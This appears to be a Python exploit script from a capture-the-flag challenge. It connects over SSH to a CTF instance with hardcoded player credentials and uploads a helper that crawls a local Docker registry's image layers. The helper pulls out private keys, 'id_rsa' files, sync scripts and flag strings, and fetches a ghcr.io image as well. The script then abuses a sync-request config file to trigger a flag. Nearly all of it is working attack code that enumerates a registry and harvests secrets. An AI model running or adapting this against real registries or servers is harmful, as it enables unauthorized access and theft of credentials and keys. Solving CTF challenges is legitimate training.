#!/usr/bin/env python3
"""Get sync-loop.sh from local registry + exploit sync mechanism"""
import paramiko, time, textwrap

HOST, PORT, USER, PW = "instance.ctf.tdho.st", 33039, "player", "reyalp"
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    ssh.connect(HOST, port=PORT, username=USER, password=PW, timeout=10)
except Exception as e:
    print("FAIL", e)
    raise SystemExit(1)

def cmd(c, t=30):
    i, o, e = ssh.exec_command(c, timeout=t)
    return (o.read() + e.read()).decode(errors="replace").encode("ascii", errors="replace").decode()

REMOTE = r'''
import urllib.request, json, gzip, tarfile, io, socket, struct, os, sys

def gw():
    with open("/proc/net/route") as f:
        next(f)
        for line in f:
            p = line.split()
            if p[1] == "00000000":
                return socket.inet_ntoa(struct.pack("<L", int(p[2], 16)))

def get(url, headers=None, timeout=15):
    req = urllib.request.Request(url, headers=headers or {})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()

reg = "http://" + gw() + ":5000"

def fetch_manifest(repo, tag):
    accepts = [
        "application/vnd.oci.image.index.v1+json",
        "application/vnd.docker.distribution.manifest.list.v2+json",
        "application/vnd.docker.distribution.manifest.v2+json",
        "application/vnd.oci.image.manifest.v1+json",
    ]
    for acc in accepts:
        try:
            req = urllib.request.Request(
                f"{reg}/v2/{repo}/manifests/{tag}",
                headers={"Accept": acc},
            )
            body = get(req.get_full_url(), dict(req.header_items()))
            m = json.loads(body)
            return acc, m
        except Exception as e:
            pass
    return None, None

def resolve_layers(repo, manifest):
    layers = []
    if "manifests" in manifest:
        for sub in manifest["manifests"]:
            d = sub["digest"]
            for acc in [
                "application/vnd.oci.image.manifest.v1+json",
                "application/vnd.docker.distribution.manifest.v2+json",
            ]:
                try:
                    req = urllib.request.Request(
                        f"{reg}/v2/{repo}/manifests/{d}",
                        headers={"Accept": acc},
                    )
                    sm = json.loads(get(req.get_full_url(), dict(req.header_items())))
                    layers.extend(sm.get("layers", []))
                    break
                except Exception:
                    continue
    else:
        layers = manifest.get("layers", [])
    return layers

def scan_layer(repo, digest):
    try:
        data = get(f"{reg}/v2/{repo}/blobs/{digest}", timeout=30)
    except Exception as e:
        return f"BLOB_ERR {digest[:20]} {e}"
    out = []
    raw = gzip.decompress(data) if data[:2] == b"\x1f\x8b" else data
    try:
        tf = tarfile.open(fileobj=io.BytesIO(raw), mode="r:*")
    except Exception as e:
        return f"TAR_ERR {digest[:20]} {e}"
    for mem in tf.getmembers():
        if not mem.isfile():
            continue
        n = mem.name.lstrip("./")
        body = tf.extractfile(mem).read()
        if any(x in n for x in ["sync-loop", "sync-agent", "watcher", "entrypoint", "id_rsa", "flag"]):
            out.append(f"\n=== {n} ({len(body)}b) ===\n{body.decode(errors='replace')}")
        elif b"BEGIN" in body and b"PRIVATE KEY" in body:
            out.append(f"\n=== KEY {n} ===\n{body.decode(errors='replace')}")
        elif b"tdho{" in body:
            out.append(f"\n=== FLAG {n} ===\n{body.decode(errors='replace')}")
    return "\n".join(out)

repos = json.loads(get(reg + "/v2/_catalog").decode()).get("repositories", [])
print("REG", reg, "REPOS", repos)

for repo in repos:
    try:
        tags = json.loads(get(f"{reg}/v2/{repo}/tags/list").decode()).get("tags") or []
    except Exception as e:
        print("TAGS_ERR", repo, e)
        continue
    for tag in tags:
        acc, manifest = fetch_manifest(repo, tag)
        if not manifest:
            print("NO_MANIFEST", repo, tag)
            continue
        print("MANIFEST", repo, tag, acc, "keys", list(manifest.keys()))
        layers = resolve_layers(repo, manifest)
        print("  layers", len(layers))
        for layer in layers:
            result = scan_layer(repo, layer["digest"])
            if result.strip():
                print(result)

# Also read running sync-loop via debugfs/copy if possible
for meth in [
    "python3 -c \"print(open('/opt/mc/scripts/sync-loop.sh','rb').read().decode())\"",
    "cat /opt/mc/scripts/sync-loop.sh",
]:
    print("\nTRY", meth)
    os.system(meth + " 2>&1")
'''

sftp = ssh.open_sftp()
with sftp.open("/tmp/reg_extract.py", "w") as f:
    f.write(REMOTE)
sftp.close()

print(cmd("python3 /tmp/reg_extract.py", 120))

# If we understand sync-loop, run exploit. Also try ghcr pull from instance
print("=== GHCR FROM INSTANCE ===")
print(cmd(r'''python3 << 'PY'
import urllib.request, json, gzip, tarfile, io
ORG, REPO, TAG = "talldwarfhosting", "stolen-schematics-game-server-prerelease", "v2.5.39"
tok = json.loads(urllib.request.urlopen(f"https://ghcr.io/token?service=ghcr.io&scope=repository:{ORG}/{REPO}:pull").read())["token"]
def g(u,a=None):
    h={"Authorization":"Bearer "+tok}
    if a: h["Accept"]=a
    r=urllib.request.Request(u,headers=h)
    return urllib.request.urlopen(r,timeout=30).read()
idx=json.loads(g(f"https://ghcr.io/v2/{ORG}/{REPO}/manifests/{TAG}","application/vnd.oci.image.index.v1+json"))
d=idx["manifests"][0]["digest"]
man=json.loads(g(f"https://ghcr.io/v2/{ORG}/{REPO}/manifests/{d}","application/vnd.oci.image.manifest.v1+json"))
for layer in man["layers"]:
    data=g(f"https://ghcr.io/v2/{ORG}/{REPO}/blobs/{layer['digest']}")
    raw=gzip.decompress(data) if data[:2]==b'\x1f\x8b' else data
    tf=tarfile.open(fileobj=io.BytesIO(raw),mode='r:*')
    for m in tf.getmembers():
        if m.isfile() and 'sync' in m.name:
            print(m.name, tf.extractfile(m).read().decode(errors='replace')[:5000])
PY''', 60))

# Exploit attempts based on sync-agent docs
print("=== EXPLOIT ===")
tests = [
    "talldwarf-sync=true",
    "talldwarf-sync-force=true",
]
for t in tests:
    cmd(f'echo "{t}" > /opt/mc/config/sync-request.conf')
    for wait in [10, 20]:
        time.sleep(10)
        r = cmd("ls -la /opt/mc/config/ 2>&1; cat /opt/mc/config/sync-result.conf 2>&1")
        print(f"after {wait}s {t}:", r)
        if "tdho{" in r or "FLAG=" in r:
            break

# Check if sync-loop creates trigger in config dir instead
print(cmd("find /opt/mc -newer /opt/mc/config/sync-request.conf -type f 2>/dev/null; ls -laR /opt/mc/ 2>&1"))

ssh.close()
